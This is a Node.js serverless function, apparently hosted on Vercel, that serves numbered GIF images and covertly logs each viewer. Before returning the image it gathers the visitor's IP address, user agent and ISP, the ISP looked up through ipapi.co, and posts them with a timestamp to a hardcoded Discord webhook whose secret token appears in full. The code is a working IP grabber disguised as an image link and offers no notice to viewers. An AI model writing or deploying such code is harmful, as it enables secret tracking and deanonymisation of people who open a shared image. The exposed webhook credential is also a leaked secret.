import { createReadStream } from 'fs';
import { stat } from 'fs/promises';
import fetch from 'node-fetch';

export default async function handler(req, res) {
  const { id } = req.query;
  
  try {
    if (!id || parseInt(id) < 1 || parseInt(id) > 20) {
      return res.status(404).end();
    }

    const gifPath = `./${id}.gif`;
    
    // Client info
    const ua = req.headers['user-agent']?.substring(0, 100) || 'Unknown';
    const forwarded = req.headers['x-forwarded-for'];
    const ip = Array.isArray(forwarded) ? forwarded[0] : forwarded?.split(',')[0]?.trim() || 'Unknown';
    
    // Simple ISP (no timeout issue)
    let isp = 'Unknown';
    try {
      const geoRes = await Promise.race([
        fetch(`https://ipapi.co/${ip}/json/`),
        new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 2000))
      ]);
      const geoData = await geoRes.json();
      isp = geoData.org || geoData.isp || 'Unknown';
    } catch {}
    
    const now = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
    
    const message = `🖼️ GIF Viewed!\\n🎬 GIF #${id}\\n🌐 IP: \`${ip}\`\\n🏢 ISP: ${isp}\\n🖥️ UA: ${ua}\\n🕐 ${now}\\n🔗 https://goyzinparis.vercel.app/${id}.gif`;
    
    const webhookUrl = 'https://discord.com/api/webhooks/1490714732683067482/ae8gBJ6SmxJLVdbz5FMO55PmuhLnPPhSkp_iAvep88ScYAnlzEf6ghUVjUD_yoVRI-h2';
    
    // Sync webhook first (fast)
    try {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
      });
    } catch (e) {
      console.error('Webhook error:', e.message);
    }

    // Serve GIF
    const stats = await stat(gifPath);
    res.writeHead(200, {
      'Content-Type': 'image/gif',
      'Content-Length': stats.size,
      'Cache-Control': 'public, max-age=3600',
      'Access-Control-Allow-Origin': '*'
    });
    createReadStream(gifPath).pipe(res);
  } catch (err) {
    console.error('GIF error:', err.message, gifPath);
    res.status(404).end();
  }
}
